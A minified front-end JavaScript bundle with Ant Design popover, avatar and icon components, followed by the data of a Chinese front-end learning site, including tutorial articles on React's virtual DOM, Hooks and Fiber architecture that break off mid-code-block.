n=e[`${r}6`];return{[`&${t}-${r}`]:{[o("arrow-background-color")]:n,[`${t}-inner`]:{backgroundColor:n},[`${t}-arrow`]:{background:"transparent"}}}})}})(o),(0,L.initZoomMotion)(o,"zoom-big")]},e=>{let{lineWidth:t,controlHeight:r,fontHeight:o,padding:n,wireframe:a,zIndexPopupBase:i,borderRadiusLG:s,marginXS:l,lineType:c,colorSplit:u,paddingSM:d}=e,p=r-o;return{titleMinWidth:177,zIndexPopup:i+30,...(0,O.getArrowToken)(e),...(0,_.getArrowOffsetToken)({contentRadius:s,limitVerticalRadius:!0}),innerPadding:12*!a,titleMarginBottom:a?0:l,titlePadding:a?`${p/2}px ${n}px ${p/2-t}px`:0,titleBorderBottom:a?`${t}px ${c} ${u}`:"none",innerContentPadding:a?`${d}px ${n}px`:0}},{resetStyle:!1,deprecatedTokens:[["width","titleMinWidth"],["minWidth","titleMinWidth"]]}),N=e=>{let{title:t,content:o,prefixCls:n,classNames:a,styles:i}=e;return t||o?r.createElement(r.Fragment,null,t&&r.createElement("div",{className:(0,u.clsx)(`${n}-title`,a?.title),style:i?.title},t),o&&r.createElement("div",{className:(0,u.clsx)(`${n}-content`,a?.content),style:i?.content},o)):null},V=e=>{let{hashId:t,prefixCls:o,className:n,style:a,placement:i="top",title:s,content:l,children:c,classNames:d,styles:p}=e,m=T(s),f=T(l),g={...e,placement:i},[h,v]=(0,I.useMergeSemantic)([d],[p],{props:g}),b=(0,u.clsx)(t,o,`${o}-pure`,`${o}-placement-${i}`,n);return r.createElement("div",{className:b,style:a},r.createElement("div",{className:`${o}-arrow`}),r.createElement(D.Popup,{...e,className:t,prefixCls:o,classNames:h,styles:v},c||r.createElement(N,{prefixCls:o,title:m,content:f,classNames:h,styles:v})))},B=r.forwardRef((e,t)=>{let{prefixCls:o,title:n,content:a,overlayClassName:i,placement:s="top",trigger:l,children:c,mouseEnterDelay:d=.1,mouseLeaveDelay:p=.1,onOpenChange:f,overlayStyle:g={},styles:h,classNames:v,motion:b,arrow:y,...S}=e,{getPrefixCls:x,className:C,style:w,classNames:k,styles:P,arrow:$,trigger:D}=(0,m.useComponentConfig)("popover"),L=x("popover",o),[_,O]=F(L),j=x(),V=(0,A.default)(y,$),B=l||D||"hover",H={...e,placement:s,trigger:B,mouseEnterDelay:d,mouseLeaveDelay:p,overlayStyle:g,styles:h,classNames:v},[z,U]=(0,I.useMergeSemantic)([k,v],[P,h],{props:H}),W=(0,u.clsx)(i,_,O,C,z.root),[q,G]=(0,E.useControlledState)(e.defaultOpen??!1,e.open),J=T(n),X=T(a);return r.createElement(M.default,{unique:!1,arrow:V,placement:s,trigger:B,mouseEnterDelay:d,mouseLeaveDelay:p,...S,prefixCls:L,classNames:{root:W,container:z.container,arrow:z.arrow},styles:{root:{...U.root,...w,...g},container:U.container,arrow:U.arrow},ref:t,open:q,onOpenChange:e=>{G(e),f?.(e)},overlay:J||X?r.createElement(N,{prefixCls:L,title:J,content:X,classNames:z,styles:U}):null,motion:{motionName:(0,R.getTransitionName)(j,"zoom-big","string"==typeof b?.motionName?b?.motionName:void 0)},"data-popover-inject":!0},c)});B._InternalPanelDoNotUseOrYouWillBeFired=e=>{let{prefixCls:t,className:o,...n}=e,{getPrefixCls:a}=r.useContext(m.ConfigContext),i=a("popover",t),[s,l]=F(i);return r.createElement(V,{...n,prefixCls:i,hashId:s,className:(0,u.clsx)(o,l)})};let H=e=>{let{size:t,shape:o}=r.useContext(b),n=r.useMemo(()=>({size:e.size||t,shape:e.shape||o}),[e.size,e.shape,t,o]);return r.createElement(b.Provider,{value:n},e.children)};k.Group=e=>{let{getPrefixCls:t,direction:o}=r.useContext(m.ConfigContext),{prefixCls:n,className:a,rootClassName:i,style:s,maxCount:l,maxStyle:c,size:d,shape:p,maxPopoverPlacement:g,maxPopoverTrigger:h,children:v,max:b}=e,y=t("avatar",n),S=`${y}-group`,x=(0,f.default)(y),[C,E]=w(y,x),T=(0,u.clsx)(S,{[`${S}-rtl`]:"rtl"===o},E,x,a,i,C),I=(0,P.toArray)(v).map((e,t)=>(0,$.cloneElement)(e,{key:`avatar-key-${t}`})),R=b?.count||l,M=I.length;if(R&&R<M){let e=I.slice(0,R),t=I.slice(R,M),o=b?.style||c,n=b?.popover?.trigger||h||"hover",a=b?.popover?.placement||g||"top",i={content:t,...b?.popover,placement:a,trigger:n,rootClassName:(0,u.clsx)(`${S}-popover`,b?.popover?.rootClassName)};return e.push(r.createElement(B,{key:"avatar-popover-key",destroyOnHidden:!0,...i},r.createElement(k,{style:o},`+${M-R}`))),r.createElement(H,{shape:p,size:d},r.createElement("div",{className:T,style:s},e))}return r.createElement(H,{shape:p,size:d},r.createElement("div",{className:T,style:s},I))};let z={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M946.5 505L560.1 118.8l-25.9-25.9a31.5 31.5 0 00-44.4 0L77.5 505a63.9 63.9 0 00-18.8 46c.4 35.2 29.7 63.3 64.9 63.3h42.5V940h691.8V614.3h43.4c17.1 0 33.2-6.7 45.3-18.8a63.6 63.6 0 0018.7-45.3c0-17-6.7-33.1-18.8-45.2zM568 868H456V664h112v204zm217.9-325.7V868H632V640c0-22.1-17.9-40-40-40H432c-22.1 0-40 17.9-40 40v228H238.1V542.3h-96l370-369.7 23.1 23.1L882 542.3h-96.1z"}}]},name:"home",theme:"outlined"};var U=e.i(9583);function W(){return(W=Object.assign.bind()).apply(this,arguments)}let q=r.forwardRef((e,t)=>r.createElement(U.default,W({},e,{ref:t,icon:z}))),G={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M516 673c0 4.4 3.4 8 7.5 8h185c4.1 0 7.5-3.6 7.5-8v-48c0-4.4-3.4-8-7.5-8h-185c-4.1 0-7.5 3.6-7.5 8v48zm-194.9 6.1l192-161c3.8-3.2 3.8-9.1 0-12.3l-192-160.9A7.95 7.95 0 00308 351v62.7c0 2.4 1 4.6 2.9 6.1L420.7 512l-109.8 92.2a8.1 8.1 0 00-2.9 6.1V673c0 6.8 7.9 10.5 13.1 6.1zM880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-40 728H184V184h656v656z"}}]},name:"code",theme:"outlined"};function J(){return(J=Object.assign.bind()).apply(this,arguments)}let X=r.forwardRef((e,t)=>r.createElement(U.default,J({},e,{ref:t,icon:G}))),K={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-696 72h136v656H184V184zm656 656H384V384h456v456zM384 320V184h456v136H384z"}}]},name:"layout",theme:"outlined"};function Q(){return(Q=Object.assign.bind()).apply(this,arguments)}let Y=r.forwardRef((e,t)=>r.createElement(U.default,Q({},e,{ref:t,icon:K}))),Z={icon:{tag:"svg",attrs:{viewBox:"0 0 1024 1024",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64L128 192v384c0 212.1 171.9 384 384 384s384-171.9 384-384V192L512 64zm312 512c0 172.3-139.7 312-312 312S200 748.3 200 576V246l312-110 312 110v330z"}},{tag:"path",attrs:{d:"M378.4 475.1a35.91 35.91 0 00-50.9 0 35.91 35.91 0 000 50.9l129.4 129.4 2.1 2.1a33.98 33.98 0 0048.1 0L730.6 434a33.98 33.98 0 000-48.1l-2.8-2.8a33.98 33.98 0 00-48.1 0L483 579.7 378.4 475.1z"}}]},name:"safety",theme:"outlined"};function ee(){return(ee=Object.assign.bind()).apply(this,arguments)}let et=r.forwardRef((e,t)=>r.createElement(U.default,ee({},e,{ref:t,icon:Z}))),er={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M864 736c0-111.6-65.4-208-160-252.9V317.3c0-15.1-5.3-29.7-15.1-41.2L536.5 95.4C530.1 87.8 521 84 512 84s-18.1 3.8-24.5 11.4L335.1 276.1a63.97 63.97 0 00-15.1 41.2v165.8C225.4 528 160 624.4 160 736h156.5c-2.3 7.2-3.5 15-3.5 23.8 0 22.1 7.6 43.7 21.4 60.8a97.2 97.2 0 0043.1 30.6c23.1 54 75.6 88.8 134.5 88.8 29.1 0 57.3-8.6 81.4-24.8 23.6-15.8 41.9-37.9 53-64a97 97 0 0043.1-30.5 97.52 97.52 0 0021.4-60.8c0-8.4-1.1-16.4-3.1-23.8H864zM762.3 621.4c9.4 14.6 17 30.3 22.5 46.6H700V558.7a211.6 211.6 0 0162.3 62.7zM388 483.1V318.8l124-147 124 147V668H388V483.1zM239.2 668c5.5-16.3 13.1-32 22.5-46.6 16.3-25.2 37.5-46.5 62.3-62.7V668h-84.8zm388.9 116.2c-5.2 3-11.2 4.2-17.1 3.4l-19.5-2.4-2.8 19.4c-5.4 37.9-38.4 66.5-76.7 66.5-38.3 0-71.3-28.6-76.7-66.5l-2.8-19.5-19.5 2.5a27.7 27.7 0 01-17.1-3.5c-8.7-5-14.1-14.3-14.1-24.4 0-10.6 5.9-19.4 14.6-23.8h231.3c8.8 4.5 14.6 13.3 14.6 23.8-.1 10.2-5.5 19.6-14.2 24.5zM464 400a48 48 0 1096 0 48 48 0 10-96 0z"}}]},name:"rocket",theme:"outlined"};function eo(){return(eo=Object.assign.bind()).apply(this,arguments)}let en=r.forwardRef((e,t)=>r.createElement(U.default,eo({},e,{ref:t,icon:er})));var ea=e.i(34779);let ei={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M692.8 412.7l.2-.2-34.6-44.3a7.97 7.97 0 00-11.2-1.4l-50.4 39.3-70.5-90.1a7.97 7.97 0 00-11.2-1.4l-37.9 29.7a7.97 7.97 0 00-1.4 11.2l70.5 90.2-.2.1 34.6 44.3c2.7 3.5 7.7 4.1 11.2 1.4l50.4-39.3 64.1 82c2.7 3.5 7.7 4.1 11.2 1.4l37.9-29.6c3.5-2.7 4.1-7.7 1.4-11.2l-64.1-82.1zM608 112c-167.9 0-304 136.1-304 304 0 70.3 23.9 135 63.9 186.5L114.3 856.1a8.03 8.03 0 000 11.3l42.3 42.3c3.1 3.1 8.2 3.1 11.3 0l253.6-253.6C473 696.1 537.7 720 608 720c167.9 0 304-136.1 304-304S775.9 112 608 112zm161.2 465.2C726.2 620.3 668.9 644 608 644s-118.2-23.7-161.2-66.8C403.7 534.2 380 476.9 380 416s23.7-118.2 66.8-161.2c43-43.1 100.3-66.8 161.2-66.8s118.2 23.7 161.2 66.8c43.1 43 66.8 100.3 66.8 161.2s-23.7 118.2-66.8 161.2z"}}]},name:"monitor",theme:"outlined"};function es(){return(es=Object.assign.bind()).apply(this,arguments)}let el=r.forwardRef((e,t)=>r.createElement(U.default,es({},e,{ref:t,icon:ei}))),ec={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M740 161c-61.8 0-112 50.2-112 112 0 50.1 33.1 92.6 78.5 106.9v95.9L320 602.4V318.1c44.2-15 76-56.9 76-106.1 0-61.8-50.2-112-112-112s-112 50.2-112 112c0 49.2 31.8 91 76 106.1V706c-44.2 15-76 56.9-76 106.1 0 61.8 50.2 112 112 112s112-50.2 112-112c0-49.2-31.8-91-76-106.1v-27.8l423.5-138.7a50.52 50.52 0 0034.9-48.2V378.2c42.9-15.8 73.6-57 73.6-105.2 0-61.8-50.2-112-112-112zm-504 51a48.01 48.01 0 0196 0 48.01 48.01 0 01-96 0zm96 600a48.01 48.01 0 01-96 0 48.01 48.01 0 0196 0zm408-491a48.01 48.01 0 010-96 48.01 48.01 0 010 96z"}}]},name:"branches",theme:"outlined"};function eu(){return(eu=Object.assign.bind()).apply(this,arguments)}let ed=r.forwardRef((e,t)=>r.createElement(U.default,eu({},e,{ref:t,icon:ec}))),ep={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M848 359.3H627.7L825.8 109c4.1-5.3.4-13-6.3-13H436c-2.8 0-5.5 1.5-6.9 4L170 547.5c-3.1 5.3.7 12 6.9 12h174.4l-89.4 357.6c-1.9 7.8 7.5 13.3 13.3 7.7L853.5 373c5.2-4.9 1.7-13.7-5.5-13.7zM378.2 732.5l60.3-241H281.1l189.6-327.4h224.6L487 427.4h211L378.2 732.5z"}}]},name:"thunderbolt",theme:"outlined"};function em(){return(em=Object.assign.bind()).apply(this,arguments)}let ef=r.forwardRef((e,t)=>r.createElement(U.default,em({},e,{ref:t,icon:ep}))),eg=[{id:"react",name:"React 生态",icon:"⚛️",count:16,description:"React 相关的核心概念、生态系统和最佳实践"},{id:"javascript",name:"Js/Ts",icon:"📜",count:14,description:"JavaScript 和 TypeScript 核心概念、高级特性和最佳实践"},{id:"css",name:"CSS 布局",icon:"🎨",count:15,description:"CSS 布局、样式设计和响应式开发的核心知识"},{id:"vue",name:"Vue 生态",icon:"💚",count:14,description:"Vue.js 框架的核心概念、生态系统和最佳实践"},{id:"performance",name:"性能优化",icon:"⚡",count:15,description:"前端性能优化的核心策略和最佳实践"},{id:"security",name:"前端安全",icon:"🔒",count:15,description:"前端安全的核心概念和防护策略"},{id:"engineering",name:"工程化",icon:"🏗️",count:15,description:"前端工程化的核心概念和最佳实践"},{id:"browser",name:"浏览器原理",icon:"🌐",count:15,description:"浏览器的工作原理和核心技术"},{id:"ai",name:"AI 学习",icon:"🤖",count:6,description:"人工智能相关的核心概念、工具和最佳实践，涵盖AI Agent、LangChain、大语言模型等前沿技术"}],eh=[{id:"react-fundamentals",title:"React 核心原理与虚拟 DOM",category:"react",difficulty:"medium",tags:["React","虚拟 DOM","组件","状态管理"],content:`## React 核心原理与虚拟 DOM

React 是一个用于构建用户界面的 JavaScript 库，其核心原理包括虚拟 DOM、组件化和单向数据流。

### ⚛️ 虚拟 DOM 原理

虚拟 DOM 是 React 性能优化的关键。它是一个轻量级的 JavaScript 对象，用来描述真实 DOM 的结构。当组件状态变化时，React 会先更新虚拟 DOM，然后通过 diff 算法计算出最小的 DOM 操作，最后批量应用到真实 DOM 上。

**虚拟 DOM 的优势：**
- **减少直接操作 DOM 的次数，提高性能**
- **提供跨平台能力，如 React Native**
- **简化状态管理和组件更新逻辑**

### 💻 代码示例：虚拟 DOM 对比

\`\`\`javascript
// 真实 DOM 操作
const element = document.createElement('div');
element.className = 'container';
element.textContent = 'Hello, World!';
document.body.appendChild(element);

// 虚拟 DOM（React）
const element = React.createElement(
  'div',
  { className: 'container' },
  'Hello, World!'
);

// JSX 语法（编译为 React.createElement）
const element = (
  <div className="container">
    Hello, World!
  </div>
);
\`\`\`

#### 🔄 React 渲染流程示例

\`\`\`javascript
// 1. 初始渲染
function App() {
  const [count, setCount] = React.useState(0);
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <button onClick={() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  );
}

// 2. 状态变化
// 用户点击按钮，setCount(count + 1) 被调用

// 3. 创建新的虚拟 DOM
// React 根据新的状态创建新的虚拟 DOM 树

// 4. Diff 算法
// React 比较新旧虚拟 DOM 树，找出差异

// 5. 最小化 DOM 操作
// React 只更新变化的部分（例如，只更新文本节点）

// 6. 批量更新
// React 将多个状态更新合并为一次 DOM 操作
\`\`\`

### 🧩 组件化思想

React 的组件化思想让代码更加模块化和可维护：
- **组件是独立的、可复用的代码单元**
- **每个组件有自己的状态和属性**
- **组件通过 props 传递数据，通过 state 管理内部状态**

### 💻 代码示例：组件化实践

\`\`\`javascript
// 函数组件
function Welcome(props) {
  return <h1>Hello, {props.name}!</h1>;
}

// 使用组件
function App() {
  return (
    <div>
      <Welcome name="Alice" />
      <Welcome name="Bob" />
    </div>
  );
}

// 类组件
class Welcome extends React.Component {
  render() {
    return <h1>Hello, {this.props.name}!</h1>;
  }
}

// 组合组件
function Card({ title, content, footer }) {
  return (
    <div className="card">
      <div className="card-header">{title}</div>
      <div className="card-body">{content}</div>
      <div className="card-footer">{footer}</div>
    </div>
  );
}

function App() {
  return (
    <Card
      title="Card Title"
      content={<p>Card content goes here.</p>}
      footer={<button>Action</button>}
    />
  );
}
\`\`\`

### 单向数据流

React 采用单向数据流，数据从父组件流向子组件：
- 父组件通过 props 向子组件传递数据
- 子组件通过回调函数与父组件通信
- 状态管理更加清晰可预测

### 代码示例

#### 单向数据流示例

\`\`\`javascript
// 父组件
function Parent() {
  const [count, setCount] = React.useState(0);
  
  const increment = () => {
    setCount(count + 1);
  };
  
  return (
    <div>
      <h1>Parent Count: {count}</h1>
      <Child count={count} onIncrement={increment} />
    </div>
  );
}

// 子组件
function Child({ count, onIncrement }) {
  return (
    <div>
      <h2>Child Count: {count}</h2>
      <button onClick={onIncrement}>Increment</button>
    </div>
  );
}

// 状态提升
// 多个子组件共享状态时，将状态提升到最近的共同父组件
function Parent() {
  const [value, setValue] = React.useState('');
  
  return (
    <div>
      <Input value={value} onChange={setValue} />
      <Display value={value} />
    </div>
  );
}

function Input({ value, onChange }) {
  return <input value={value} onChange={(e) => onChange(e.target.value)} />;
}

function Display({ value }) {
  return <p>Value: {value}</p>;
}
\`\`\`

### 生命周期

React 组件的生命周期包括挂载、更新和卸载三个阶段：
- 挂载阶段：constructor → render → componentDidMount：React组件的生命周期挂载阶段包括三个主要方法，constructor是组件创建时调用的构造函数，用于初始化state和绑定方法，render方法负责返回JSX描述的UI结构，componentDidMount在组件挂载到DOM后立即调用，是进行DOM操作、网络请求、订阅事件等副作用操作的最佳时机，挂载阶段只执行一次，是组件生命周期的起点
- 更新阶段：shouldComponentUpdate → render → componentDidUpdate：React组件的更新阶段在props或state变化时触发，shouldComponentUpdate用于决定是否需要重新渲染，返回false可以跳过渲染优化性能，render方法根据新的props和state返回新的JSX，componentDidUpdate在组件更新后调用，可以访问更新前的props和state，是进行DOM操作、网络请求等副作用操作的时机，更新阶段可能执行多次
- 卸载阶段：componentWillUnmount：React组件的卸载阶段只包含componentWillUnmount一个方法，在组件从DOM中移除前调用，是进行清理操作的最佳时机，如清除定时器、取消网络请求、移除事件监听器、清理订阅等，componentWillUnmount只执行一次，是组件生命周期的终点，不正确的清理可能导致内存泄漏

### 代码示例

#### 类组件生命周期示例

\`\`\`javascript
class LifecycleComponent extends React.Component {
  constructor(props) {
    super(props);
    this.state = { count: 0 };
    console.log('Constructor');
  }
  
  componentDidMount() {
    console.log('Component did mount');
    // 发起网络请求
    this.fetchData();
    // 设置定时器
    this.timer = setInterval(() => {
      this.setState({ count: this.state.count + 1 });
    }, 1000);
  }
  
  componentDidUpdate(prevProps, prevState) {
    console.log('Component did update');
    // 检查 props 或 state 是否变化
    if (prevProps.id !== this.props.id) {
      this.fetchData();
    }
  }
  
  componentWillUnmount() {
    console.log('Component will unmount');
    // 清理定时器
    clearInterval(this.timer);
    // 取消网络请求
    if (this.abortController) {
      this.abortController.abort();
    }
  }
  
  fetchData() {
    this.abortController = new AbortController();
    fetch(\`/api/data/\${this.props.id}\`, {
      signal: this.abortController.signal
    })
      .then(response => response.json())
      .then(data => this.setState({ data }))
      .catch(error => console.error('Error:', error));
  }
  
  render() {
    return (
      <div>
        <h1>Count: {this.state.count}</h1>
        <p>Props: {this.props.id}</p>
      </div>
    );
  }
}
\`\`\`

#### Hooks 生命周期示例

\`\`\`javascript
function LifecycleComponent({ id }) {
  const [count, setCount] = React.useState(0);
  const [data, setData] = React.useState(null);
  
  // 挂载和更新
  React.useEffect(() => {
    console.log('Effect ran');
    
    // 发起网络请求
    const abortController = new AbortController();
    fetch(\`/api/data/\${id}\`, {
      signal: abortController.signal
    })
      .then(response => response.json())
      .then(data => setData(data))
      .catch(error => console.error('Error:', error));
    
    // 清理函数（卸载或依赖变化时执行）
    return () => {
      console.log('Cleanup');
      abortController.abort();
    };
  }, [id]); // 依赖数组
  
  // 挂载
  React.useEffect(() => {
    console.log('Component mounted');
    
    // 设置定时器
    const timer = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
    
    // 清理定时器
    return () => clearInterval(timer);
  }, []); // 空依赖数组，只在挂载时执行
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <p>Props: {id}</p>
      {data && <pre>{JSON.stringify(data, null, 2)}</pre>}
    </div>
  );
}
\`\`\`

### 最佳实践

- 使用函数组件和 Hooks 代替 class 组件
- 合理使用 state 和 props，避免不必要的渲染
- 使用 key 属性提高列表渲染性能
- 组件拆分要合理，保持单一职责原则
- 使用 React.memo 优化组件渲染
- 使用 useMemo 和 useCallback 优化性能
- 避免在渲染中创建新对象和函数
- 合理使用 Context API`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-hooks",title:"React Hooks 深度解析",category:"react",difficulty:"medium",tags:["React","Hooks","useState","useEffect"],content:`## React Hooks 深度解析

React Hooks 是 React 16.8 引入的革命性特性，它彻底改变了 React 组件的编写方式，让函数组件也能拥有状态和生命周期特性，同时解决了 class 组件中 this 指向混乱、生命周期方法逻辑分散等问题。

### 常用 Hooks 详解

**useState - 状态管理基础：**
useState 是最基础的 Hook，用于在函数组件中添加状态管理能力。它接收一个初始值或初始化函数，返回一个包含当前状态值和更新函数的数组。useState 支持函数式更新，可以在更新函数中接收前一个状态值，这在处理异步更新或基于前值计算新值时特别有用。惰性初始化允许传入一个函数作为初始值，该函数只在首次渲染时执行，适合需要复杂计算的初始状态。

**useEffect - 副作用处理核心：**
useEffect 是处理副作用的核心 Hook，包括数据获取、订阅、DOM 操作、定时器等。它接收一个回调函数和一个可选的依赖数组，当依赖数组中的值发生变化时执行回调。空依赖数组表示只在组件挂载和卸载时执行，不传依赖数组则每次渲染都执行。useEffect 的清理函数在组件卸载或下一次 effect 执行前调用，用于取消订阅、清除定时器等资源释放操作。

**useRef - 可变引用与 DOM 访问：**
useRef 返回一个可变的 ref 对象，其 current 属性可以保存任意值，且在整个组件生命周期内保持不变。useRef 的主要用途包括：访问 DOM 元素（通过将 ref 传递给 JSX 元素）、保存可变值而不触发重新渲染、存储前一次渲染的值。与 useState 不同，修改 useRef.current 不会触发组件重新渲染，这使得它非常适合存储不影响渲染的数据。

**useMemo - 计算结果缓存：**
useMemo 用于缓存昂贵的计算结果，避免在每次渲染时重复计算。它接收一个计算函数和依赖数组，只有当依赖项变化时才重新计算。useMemo 特别适合处理复杂的数据转换、过滤、排序等操作，可以有效减少不必要的计算开销。但需要注意，useMemo 本身也有开销，对于简单的计算可能得不偿失。

**useCallback - 函数引用缓存：**
useCallback 用于缓存函数引用，避免在每次渲染时创建新的函数实例。它接收一个回调函数和依赖数组，返回一个记忆化的回调函数。useCallback 主要用于优化子组件的渲染性能，特别是当子组件使用 React.memo 或依赖函数引用相等性时。与 useMemo 不同，useCallback 缓存的是函数本身，而不是函数的返回值。

### 代码示例

\`\`\`javascript
// useState 基础用法
function Counter() {
  const [count, setCount] = useState(0);
  const [items, setItems] = useState([]);
  
  // 函数式更新
  const increment = () => setCount(prev => prev + 1);
  
  // 惰性初始化
  const [data, setData] = useState(() => {
    const saved = localStorage.getItem('data');
    return saved ? JSON.parse(saved) : [];
  });
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+1</button>
    </div>
  );
}

// useEffect 数据获取与清理
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    let cancelled = false;
    
    async function fetchUser() {
      const response = await fetch(\`/api/users/\${userId}\`);
      const data = await response.json();
      if (!cancelled) {
        setUser(data);
      }
    }
    
    fetchUser();
    
    return () => {
      cancelled = true;
    };
  }, [userId]);
  
  if (!user) return <div>Loading...</div>;
  return <div>{user.name}</div>;
}

// useRef 访问 DOM
function TextInput() {
  const inputRef = useRef(null);
  
  const focusInput = () => {
    inputRef.current?.focus();
  };
  
  return (
    <div>
      <input ref={inputRef} type="text" />
      <button onClick={focusInput}>Focus Input</button>
    </div>
  );
}

// useMemo 和 useCallback 优化
function ExpensiveComponent({ items, onItemClick }) {
  // 缓存排序结果
  const sortedItems = useMemo(() => {
    console.log('Sorting items...');
    return [...items].sort((a, b) => a.name.localeCompare(b.name));
  }, [items]);
  
  // 缓存事件处理函数
  const handleClick = useCallback((id) => {
    console.log('Item clicked:', id);
    onItemClick?.(id);
  }, [onItemClick]);
  
  return (
    <ul>
      {sortedItems.map(item => (
        <li key={item.id} onClick={() => handleClick(item.id)}>
          {item.name}
        </li>
      ))}
    </ul>
  );
}

// 自定义 Hook 示例
function useLocalStorage(key, initialValue) {
  const [storedValue, setStoredValue] = useState(() => {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : initialValue;
    } catch (error) {
      console.error(error);
      return initialValue;
    }
  });
  
  const setValue = useCallback((value) => {
    try {
      const valueToStore = value instanceof Function ? value(storedValue) : value;
      setStoredValue(valueToStore);
      localStorage.setItem(key, JSON.stringify(valueToStore));
    } catch (error) {
      console.error(error);
    }
  }, [key, storedValue]);
  
  return [storedValue, setValue];
}

// 使用自定义 Hook
function ThemeToggle() {
  const [theme, setTheme] = useLocalStorage('theme', 'light');
  
  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };
  
  return (
    <button onClick={toggleTheme}>
      Current theme: {theme}
    </button>
  );
}
\`\`\`

### 自定义 Hooks 设计原则

自定义 Hooks 是复用状态逻辑的强大工具，以 "use" 开头命名是 React 的约定。设计良好的自定义 Hooks 应该遵循以下原则：单一职责，每个 Hook 只处理一个特定的逻辑；清晰的参数和返回值；合理的依赖管理；良好的类型定义。常见的自定义 Hooks 包括：useFetch（数据获取）、useDebounce（防抖）、useThrottle（节流）、useWindowSize（窗口尺寸）、useMediaQuery（媒体查询）等。

### 最佳实践

- **只在最顶层调用 Hooks**：不要在循环、条件或嵌套函数中调用 Hooks，确保 Hooks 的调用顺序在每次渲染中保持一致
- **只在 React 函数中调用 Hooks**：在函数组件或自定义 Hook 中调用，不要在普通 JavaScript 函数中调用
- **合理使用依赖数组**：确保依赖数组包含所有在 effect 中使用的外部变量，避免遗漏依赖导致的 bug
- **避免在渲染中创建函数和对象**：使用 useCallback 和 useMemo 缓存，避免不必要的子组件重新渲染
- **使用 React.memo 配合 useCallback**：当子组件接收函数 props 时，配合使用可以优化性能
- **正确处理清理逻辑**：在 useEffect 中返回清理函数，防止内存泄漏`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-fiber",title:"React Fiber 架构与并发模式",category:"react",difficulty:"hard",tags:["React","Fiber","并发","调度"],content:`## React Fiber 架构与并发模式

React Fiber 是 React 16 引入的全新协调引擎，它彻底重构了 React 的核心算法，为 React 带来了并发渲染能力。Fiber 的设计目标是解决大型 React 应用中更新卡顿的问题，实现可中断的渲染过程，让高优先级的用户交互能够快速响应。

### Fiber 核心概念深度解析

**Fiber 节点 - 核心数据结构：**
Fiber 节点是 Fiber 架构的核心数据结构，每个 React 元素对应一个 Fiber 节点。Fiber 节点包含了组件的所有信息：type（组件类型）、key（列表标识）、props（属性）、state（状态）、effectTag（副作用标记）等。Fiber 节点通过 return、child、sibling 三个指针形成链表树结构，return 指向父节点，child 指向第一个子节点，sibling 指向下一个兄弟节点。这种链表结构使得遍历可以在任意节点暂停和恢复，是实现可中断渲染的基础。

**双缓存技术 - 无闪烁更新：**
双缓存技术是 Fiber 架构的关键优化，React 同时维护两棵 Fiber 树：current 树（当前屏幕显示的树）和 workInProgress 树（正在构建的新树）。当 workInProgress 树构建完成后，React 只需要交换 rootFiber 的 current 指针，就能完成更新。这种技术避免了逐个节点更新导致的页面闪烁，同时支持回滚操作。双缓存还使得 React 能够在内存中完成所有计算后再一次性提交到 DOM，提高了渲染效率。

**调度器 - 智能任务管理：**
调度器（Scheduler）负责管理任务的优先级和执行时机。React 将任务分为不同优先级：Immediate（立即执行，如用户输入）、UserBlocking（用户阻塞级别）、Normal（普通级别）、Low（低优先级）、Idle（空闲时执行）。调度器使用时间分片技术，将大任务拆分为小任务，每个任务执行一段时间后检查是否需要让出主线程，避免阻塞用户交互。高优先级任务可以中断正在执行的低优先级任务，确保用户交互的流畅性。

### 代码示例

\`\`\`javascript
// Fiber 节点结构示意
const fiber = {
  type: 'div',           // 元素类型
  key: null,             // 列表 key
  props: {               // 属性
    className: 'container',
    children: []
  },
  stateNode: null,       // DOM 节点或组件实例
  
  // Fiber 树结构
  return: parentFiber,   // 父节点
  child: firstChildFiber, // 第一个子节点
  sibling: nextFiber,    // 下一个兄弟节点
  
  // 状态和副作用
  memoizedState: null,   // Hooks 链表
  memoizedProps: null,   // 上一次的 props
  pendingProps: props,   // 新的 props
  effectTag: 0,          // 副作用标记（Placement, Update, Deletion 等）
  flags: 0,              // 新版 React 使用 flags
  lanes: 0,              // 优先级标记
};

// useTransition 使用示例
function SearchComponent() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const handleSearch = (e) => {
    const value = e.target.value;
    
    // 立即更新输入框（高优先级）
    setQuery(value);
    
    // 将搜索结果更新标记为低优先级
    startTransition(() => {
      const filtered = largeDataList.filter(item => 
        item.name.toLowerCase().includes(value.toLowerCase())
      );
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input 
        type="text" 
        value={query} 
        onChange={handleSearch}
        placeholder="Search..."
      />
      {isPending && <span>Searching...</span>}
      <ResultList results={results} />
    </div>
  );
}

// useDeferredValue 使用示例
function DeferredList({ query }) {
  const deferredQuery = useDeferredValue(query);
  
  const results = useMemo(() => {
    return largeDataList.filter(item =>
      item.name.toLowerCase().includes(deferredQuery.toLowerCase())
    );
  }, [deferredQuery]);
  
